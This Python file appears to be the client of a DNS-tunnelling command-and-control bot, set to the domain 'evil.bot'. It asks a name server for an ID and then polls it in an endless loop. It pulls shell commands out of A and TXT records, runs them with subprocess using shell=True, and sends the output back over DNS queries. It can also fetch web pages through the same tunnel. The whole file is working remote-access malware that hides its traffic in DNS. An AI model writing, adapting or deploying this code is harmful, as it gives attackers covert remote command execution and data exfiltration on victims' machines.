import dns.message
import dns.flags
import dns.query
import dns.name
import dns.rdatatype
import dns.resolver
import subprocess
from time import sleep
from client_state import ClientState, ClientStateRequestHandler, ClientStateResponseHandler, ClientStateReader, \
    StateEnum


class Communicator:

    def __init__(self, client_state: ClientState, domain: str, name_server: str, request_lag_seconds: int = 1):
        self._name_server = name_server
        self._response_handler = ClientStateResponseHandler(client_state)
        self._request_handler = ClientStateRequestHandler(client_state, domain)
        self._state_reader = ClientStateReader(client_state)
        self._request_lag_seconds = request_lag_seconds

    def request_id(self):
        query = self._request_handler.request_id()
        response = dns.query.udp(query, self._name_server)
        r_type, [data] = self.unpack_response(response)
        self._response_handler.client_id(client_id=int(data[data.rindex(b'.') + 1:]))

    def poll(self, auto_respond=False) -> str:
        query = self._request_handler.poll()
        response = dns.query.udp(query, self._name_server)
        _, data = self.unpack_response(response)

        match data:
            case [b"DATA", data]:
                self._response_handler.data(data, done=False)
                return self._continue()
            case [b"SHELL", data]:
                self._response_handler.command(data, done=False)
                command = self._continue()
                if auto_respond:
                    self.shell(command)
                    return f"EXECUTED: {command}"
                else:
                    return command
            case [b"NOTHING"]:
                if self._state_reader.read_state() == StateEnum.RECEIVING_DATA:
                    self._response_handler.data(b"", done=True)
                    return self._state_reader.read_latest_data()
                elif self._state_reader.read_state() == StateEnum.RECEIVING_SHELL:
                    return self._response_handler.command(b"", done=True)
                else:
                    return "NOTHING TO DO"

    def curl(self, webpage: str) -> str:
        query, done = self._request_handler.curl(webpage)
        response = dns.query.udp(query, self._name_server)

        if not done:
            response = self._continue_last_request()

        _, data = self.unpack_response(response)

        while data[0] != b"NOTHING":
            self._response_handler.data(data[1], done=False)
            query = self._request_handler.continue_request()
            response = dns.query.udp(query, self._name_server)

            _, data = self.unpack_response(response)

        self._response_handler.data(b"", done=True)

        return self._state_reader.read_latest_data()

    def data(self, head: str, body: str):
        # send head
        query, done = self._request_handler.data(head, True)
        dns.query.udp(query, self._name_server)

        if not done:
            self._continue_last_request()

        # send body
        query, done = self._request_handler.data(body, False)
        dns.query.udp(query, self._name_server)

        if not done:
            self._continue_last_request()

    def shell(self, command: str):
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
        data = process.communicate()[0].decode('utf-8')

        self.data(head=command, body=data)

    def _continue(self) -> str:
        if self._request_lag_seconds:
            sleep(self._request_lag_seconds)

        query = self._request_handler.continue_request()
        response = dns.query.udp(query, self._name_server)
        _, data = self.unpack_response(response)

        match data:
            case [b"DATA", data]:
                self._response_handler.data(data, done=False)
                return self._continue()
            case [b"SHELL", data]:
                self._response_handler.command(data, done=False)
                return self._continue()
            case [b"NOTHING"]:
                if self._state_reader.read_state() == StateEnum.RECEIVING_DATA:
                    self._response_handler.data(b"", done=True)
                    return self._state_reader.read_latest_data()
                elif self._state_reader.read_state() == StateEnum.RECEIVING_SHELL:
                    return self._response_handler.command(b"", done=True)

    def _continue_last_request(self) -> dns.message.Message:
        done = False
        while not done:
            if self._request_lag_seconds:
                sleep(self._request_lag_seconds)
            query, done = self._request_handler.continue_last_request()
            response = dns.query.udp(query, self._name_server)

        return response

    @staticmethod
    def unpack_response(response: dns.message.Message) -> tuple[dns.rdatatype, list[bytes]]:
        answer = response.answer[0]
        response_type = dns.rdatatype.to_text(answer.rdtype)

        response_data = list(answer.items.keys())[0]

        if response_type == dns.rdatatype.A.name:
            return response_type, [response_data.address.encode('utf-8')]
        elif response_type == dns.rdatatype.TXT.name:
            return response_type, response_data.strings
        else:
            raise ValueError(f"RESPONSE TYPE {response_type} not supported")


class AutoCommunicator:

    def __init__(self, communicator: Communicator, poll_seconds: int):
        self._communicator = communicator
        self._poll_seconds = poll_seconds

        self._communicator.request_id()

        while True:
            response = self._communicator.poll(auto_respond=True)
            print(response)
            sleep(self._poll_seconds)


def main():
    name_server = '127.0.0.1'
    domain = 'evil.bot'

    client_state = ClientState()
    comm = Communicator(client_state=client_state, domain=domain, name_server=name_server, request_lag_seconds=1)
    auto_comm = AutoCommunicator(comm, poll_seconds=10)


if __name__ == '__main__':
    main()
